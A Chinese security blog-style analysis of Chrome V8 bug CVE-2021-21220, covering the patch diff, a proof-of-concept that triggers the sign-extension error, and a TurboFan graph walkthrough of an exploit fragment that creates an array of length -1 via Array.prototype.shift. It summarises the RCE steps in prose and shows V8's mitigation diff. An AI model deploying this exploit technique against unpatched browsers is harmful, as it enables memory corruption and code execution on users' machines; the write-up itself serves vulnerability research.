# **一切的起点**

在4月13日，一位大佬放出来一个chrome的0day而在最新版的v8上，该poc无法触发漏洞，故可能是chrome的最新版尚未更新的漏洞，而当天chrome也释放了最新版，从致谢中可以看到：

    
    
    [$TBD][1196781] High CVE-2021-21206: Use after free in Blink. Reported by Anonymous on 2021-04-07
    [$N/A][1196683] High CVE-2021-21220: Insufficient validation of untrusted input in V8 for x86_64. Reported by Bruno Keith (@bkth_) & Niklas Baumstark (@_niklasb) of Dataflow Security (@dfsec_it) via ZDI (ZDI-CAN-13569) on 2021-04-07

该漏洞应该就是CVE-2021-21220了。

#  **漏洞分析**

通过bug id可以快速的定位到，修复改漏洞的 commit为

02f84c745fc0cae5927a66dc4a3e81334e8f60a6 ，通过diff，可以快速的定位到patch代码：

![](https://image.3001.net/images/20210922/1632283000_614aa978ee56137488aed.png!small)

本次代码漏洞出现在VisitChangeInt32ToInt64函数中，也就是在生成ChangeInt32ToInt64的汇编代码时出现的问题，patch之后的代码逻辑是：在kWord32的情况下，无论如何都有带符号位的扩展。

从patch中可以看出，该漏洞是因为使用了无符号扩展所导致。

通过对exp的简单的分析，构造poc如下：

    
    
    const _arr = new Uint32Array([2**31]);
    
    function foo(a) {
        var x = 1;
        x = (_arr[0] ^ 0) + 1;
        return x;
    }
    
    %PrepareFunctionForOptimization(foo);
    console.log(foo(true));
    %OptimizeFunctionOnNextCall(foo);
    console.log(foo(true));
    

通过测试发现，优化前与优化后结果产生了差异：

    
    
    -2147483647
    2147483649

为了进一步分析漏洞成因，可以通过--trace-turbo将优化的中间过程打出来。

![](https://image.3001.net/images/20210922/1632283107_614aa9e3c00e32ef2d6b0.png!small)

通过上图可以看出，在turbofan优化阶段，会将SpeculativeNumberBitwiseXor转换成Word32Xor与ChangeInt32ToInt64。

而在随后的优化中会调用ReduceWord32Xor去优化Word32Xor：

    
    
    template <typename WordNAdapter>
    Reduction MachineOperatorReducer::ReduceWordNXor(Node* node) {
      using A = WordNAdapter;
      A a(this);
    
      typename A::IntNBinopMatcher m(node);
      if (m.right().Is(0)) return Replace(m.left().node());  // x ^ 0 => x
      if (m.IsFoldable()) {                                  // K ^ K => K
        return a.ReplaceIntN(m.left().Value() ^ m.right().Value());
      }
      if (m.LeftEqualsRight()) return ReplaceInt32(0);  // x ^ x => 0
      if (A::IsWordNXor(m.left()) && m.right().Is(-1)) {
        typename A::IntNBinopMatcher mleft(m.left().node());
        if (mleft.right().Is(-1)) {  // (x ^ -1) ^ -1 => x
          return Replace(mleft.left().node());
        }
      }
    
      return a.TryMatchWordNRor(node);
    }
    
    Reduction MachineOperatorReducer::ReduceWord32Xor(Node* node) {
      DCHECK_EQ(IrOpcode::kWord32Xor, node->opcode());
      return ReduceWordNXor<Word32Adapter>(node);
    }

从代码逻辑中可以看出，当检测到右值为0的时候，则会直接去除该节点，并且用左节点进行替换。在图中的表现为：

![](https://image.3001.net/images/20210922/1632283555_614aaba37fc5773600ef4.png!small)

从图中可以看到，该优化之后，会导致LoadTypedElement与ChangeInt32ToInt64相连，再回到VisitChangeInt32ToInt64的代码中可以看到：

    
    
    void InstructionSelector::VisitChangeInt32ToInt64(Node* node) {
      DCHECK_EQ(node->InputCount(), 1);
      Node* input = node->InputAt(0);
      if (input->opcode() == IrOpcode::kTruncateInt64ToInt32) {
        node->ReplaceInput(0, input->InputAt(0));
      }
    
      X64OperandGenerator g(this);
      Node* const value = node->InputAt(0);
      if (value->opcode() == IrOpcode::kLoad && CanCover(node, value)) {
        LoadRepresentation load_rep = LoadRepresentationOf(value->op());
        MachineRepresentation rep = load_rep.representation();
        InstructionCode opcode = kArchNop;
        switch (rep) {
          case MachineRepresentation::kBit:  // Fall through.
          case MachineRepresentation::kWord8:
            opcode = load_rep.IsSigned() ? kX64Movsxbq : kX64Movzxbq;
            break;
          case MachineRepresentation::kWord16:
            opcode = load_rep.IsSigned() ? kX64Movsxwq : kX64Movzxwq;
            break;
          case MachineRepresentation::kWord32:
            opcode = load_rep.IsSigned() ? kX64Movsxlq : kX64Movl;
            break;
          default:
            UNREACHABLE();
            return;
        }
        InstructionOperand outputs[] = {g.DefineAsRegister(node)};
        size_t input_count = 0;
        InstructionOperand inputs[3];
        AddressingMode mode = g.GetEffectiveAddressMemoryOperand(
            node->InputAt(0), inputs, &input_count);
        opcode |= AddressingModeField::encode(mode);
        Emit(opcode, 1, outputs, input_count, inputs);
      } else {
        Emit(kX64Movsxlq, g.DefineAsRegister(node), g.Use(node->InputAt(0)));
      }
    }

当输入节点是load的时候，则会根据输入节点的类型去选择不同的扩展方式，如果输入节点是无符号形，则会变成无符号形的扩展，而如果是有符号形，则会变成有符号的扩展。而poc中load是无符号形的，结果这里误用了无符号的扩展，导致poc在优化之后输出的结果为2**31
+ 1 = 2147483649。

所以该漏洞是可以说是不正当的优化导致两个节点异常链接。也可以说是无论什么情况下，ChangeInt32ToInt64不该存在无符号的32位扩展导致的。而我更倾向于前者。

##  **利用分析**

再次审查exp：

    
    
    function foo(a) {
        var x = 1;
        x = (_arr[0] ^ 0) + 1;
    
        x = Math.abs(x);
        x -= 2147483647;
        x = Math.max(x, 0);
    
        x -= 1;
        if(x==-1) x = 0;
    
        var arr = new Array(x);
        arr.shift();
        var cor = [1.1, 1.2, 1.3];
    
        return [arr, cor];
    }

当拿到该exp的时候，我十分好奇，到底是如何通过Array.Prototype.Shift构造出一个长度位-1的数组？通过对jit之后的代码进行追踪，我发现，该问题出现在Array.Prototype.Shift最后修改长度的位置，具体漏洞位置在如下IR中：

![](https://image.3001.net/images/20210922/1632284178_614aae12ab2b72293a863.png!small)

接下来开始我们的分析

1、var arr = new
Array(x);这句话对应着图中的86号节点：JSCreateArray。该节点创建了一个js数组。2、创建完js数组之后，控制流便会来到156号节点，而该处节点判断了当前array的长度是否等于0，如果等于0便会从157号ifTrue节点流出，而如果不等于0
，则会经由158号节点ifFalse流向161号节点，再次检查当前数组是否小于等于100，如果当长度大于100的时候，则会经由182号节点流向186号节点：Call[Code:ArrayShift:r1s5i9f1]。而这里则会调用Array.Prototype.Shift函数的慢路径，当然这不是本次关注的重点。当长度小于100的时候，便会经由162号节点流向166号的Loop，从而进入一个循环，而该处循环的功能则是Inlining后的Array.Prototype.Shift的快路径（详细过程可以参考JSCallReducer::ReduceArrayPrototypeShift的实现，此处不再赘述）。3、上一轮进入到了Array.Prototype.Shift的快路径之中。这里并不去关注内部实现的细节，观察该Loop的出口，Loop的出口会经由172号节点流向173号节点，而这里也就是循环的出口，再注意一下循环出口有一处180号：StoreField[+12]。而这正是向Array的length字段写入的操作。4、而180号写入的值来自于179的NumberSubtract，而179的操作是对Array的length字段进行减一的操作。那么180号节点的StoreField[+12]理论上并没有什么问题。

  

而之所以会出现问题，主要是出现再typer的优化上面：

1、在优化阶段，Turbofan会去对部分节点进行预测，从而进一步优化jit的性能。而这些是Typer中的预测，此处不再进行赘述。通过Typer的预测，turbofan认为，x是一个为0的定值：

    
    
    function foo(a) {
     var x = 1;
     x = (_arr[0] ^ 0) + 1; // x => -2147483647 ~ 2147483648
    
     x = Math.abs(x); // x => 0 ~ 2147483648
     x -= 2147483647; // x => -2147483647 ~ 1
     x = Math.max(x, 0); // x => 0 ~ 1
    
     x -= 1; // x => -1 ~ 0
     if(x==-1) x = 0; // x => -1 ~ 0
    
     var arr = new Array(x); // x => 0 ~ 0
     arr.shift();
     var cor = [1.1, 1.2, 1.3];
    
     return [arr, cor];
    }

![](https://image.3001.net/images/20210922/1632284232_614aae483fad91d62d842.png!small)

2、在接下来的LoadElimination优化中，Turbofan会对154号：LoadField[+12]进行优化，Turbofan会去找到对该处进行复制的位置，并进行替换，这里在优化之后会被替换为214号：CheckBounds（该处替换逻辑详见LoadElimination::ReduceLoadField函数）。

3、而CheckBounds的Typer为Range(0,
0)。其实就是表示该值为0。而在优化171号：NumberLessThan的时候，发现根据Typer显示，该处条件无论如何都不会成功，故171号节点的typer会被优化为False（该处优化逻辑详见TypeNarrowingReducer::Reduce函数）。接着便会触发常量折叠，变成一个常数（详见ConstantFoldingReducer::Reduce函数）。

4、再对172号节点：Branch进行优化的时候，由于该条件输入恒为False，故会将166号：Loop节点替换173号：ifFalse节点，并且会将174号：ifTrue替换为dead节点（该处优化逻辑详见CommonOperatorReducer::ReduceBranch函数）。

5、由于174号：ifTrue节点变成了dead节点，这就导致166号Loop节点不会再进行循环，从而会将162号：ifTrue节点替换166号：Loop节点（该处优化逻辑详见DeadCodeElimination::ReduceLoopOrMerge函数）。

6、至此Loop循环被优化结束，但是优化并没有停止，接着会去优化179号节点：NumberSubtract，前面说到154号节点：LoadField[+12]被替换为214号节点：CheckBounds。而214号节点的Typer为0，此处会被优化为-1（此处优化逻辑与171号相同，详见TypeNarrowingReducer::Reduce与ConstantFoldingReducer::Reduce函数）。

以下是LoadElimination优化之后的节点图：

![](https://image.3001.net/images/20210922/1632288605_614abf5dab32dee3de64f.png!small)

从LoadElimination优化之后的节点图可以看出，当长度x不等于0，且小于100的情况，便会触发向生成的JSArray的长度字段中写入-1的操作。

至此该处利用分析结束，其他RCE都是比较常规操作。在有oob之后便可以伪造一个任意读写的JSArray，再利用ArrayBuffer的backing
store去写rwx段，最后rce。

但是任有一些问题，通过对Turbofan的研究发现，NumberEqual和NumberlessThanOrEqual是不会被优化掉的（或许被优化掉了，就不会有这个利用路径了）。

##  **小计**

在爆出漏洞之后两天，v8团队重拳出击，直接修了这一条利用路径，这是commit链接

（https://github.com/v8/v8/commit/d4aafa4022b718596b3deadcc3cdcb9209896154）

    
    
    diff --git a/src/compiler/js-call-reducer.cc b/src/compiler/js-call-reducer.cc
    index 1a56f79867..64fd85f481 100644
    --- a/src/compiler/js-call-reducer.cc
    +++ b/src/compiler/js-call-reducer.cc
    @@ -5393,24 +5393,31 @@ Reduction JSCallReducer::ReduceArrayPrototypePop(Node* node) {
        }
    
        // Compute the new {length}.
    -      length = graph()->NewNode(simplified()->NumberSubtract(), length,
    -                                jsgraph()->OneConstant());
    +      Node* new_length = graph()->NewNode(simplified()->NumberSubtract(),
    +                                          length, jsgraph()->OneConstant());
    +
    +      // This extra check exists solely to break an exploitation technique
    +      // that abuses typer mismatches.
    +      new_length = efalse = graph()->NewNode(
    +          simplified()->CheckBounds(p.feedback(),
    +                                    CheckBoundsFlag::kAbortOnOutOfBounds),
    +          new_length, length, efalse, if_false);
    
           // Store the new {length} to the {receiver}.
           efalse = graph()->NewNode(
               simplified()->StoreField(AccessBuilder::ForJSArrayLength(kind)),
    -          receiver, length, efalse, if_false);
    +          receiver, new_length, efalse, if_false);
    
           // Load the last entry from the {elements}.
           vfalse = efalse = graph()->NewNode(
               simplified()->LoadElement(AccessBuilder::ForFixedArrayElement(kind)),
    -          elements, length, efalse, if_false);
    +          elements, new_length, efalse, if_false);
    
           // Store a hole to the element we just removed from the {receiver}.
           efalse = graph()->NewNode(
               simplified()->StoreElement(
                   AccessBuilder::ForFixedArrayElement(GetHoleyElementsKind(kind))),
    -          elements, length, jsgraph()->TheHoleConstant(), efalse, if_false);
    +          elements, new_length, jsgraph()->TheHoleConstant(), efalse, if_false);
         }
    
         control = graph()->NewNode(common()->Merge(2), if_true, if_false);
    @@ -5586,19 +5593,27 @@ Reduction JSCallReducer::ReduceArrayPrototypeShift(Node* node) {
             }
    
             // Compute the new {length}.
    -        length = graph()->NewNode(simplified()->NumberSubtract(), length,
    -                                  jsgraph()->OneConstant());
    +        Node* new_length = graph()->NewNode(simplified()->NumberSubtract(),
    +                                            length, jsgraph()->OneConstant());
    +
    +        // This extra check exists solely to break an exploitation technique
    +        // that abuses typer mismatches.
    +        new_length = etrue1 = graph()->NewNode(
    +            simplified()->CheckBounds(p.feedback(),
    +                                      CheckBoundsFlag::kAbortOnOutOfBounds),
    +            new_length, length, etrue1, if_true1);
    
             // Store the new {length} to the {receiver}.
             etrue1 = graph()->NewNode(
                 simplified()->StoreField(AccessBuilder::ForJSArrayLength(kind)),
    -            receiver, length, etrue1, if_true1);
    +            receiver, new_length, etrue1, if_true1);
    
             // Store a hole to the element we just removed from the {receiver}.
             etrue1 = graph()->NewNode(
                 simplified()->StoreElement(AccessBuilder::ForFixedArrayElement(
                     GetHoleyElementsKind(kind))),
    -            elements, length, jsgraph()->TheHoleConstant(), etrue1, if_true1);
    +            elements, new_length, jsgraph()->TheHoleConstant(), etrue1,
    +            if_true1);
           }
    
           Node* if_false1 = graph()->NewNode(common()->IfFalse(), branch1);

从diff文件中可以看出，在Array.Prototype.Shift和Array.Prototype.Pop的最后写入length的位置，加入了一个CheckBounds，这就导致如果此处出现了-1，则会无法写入。

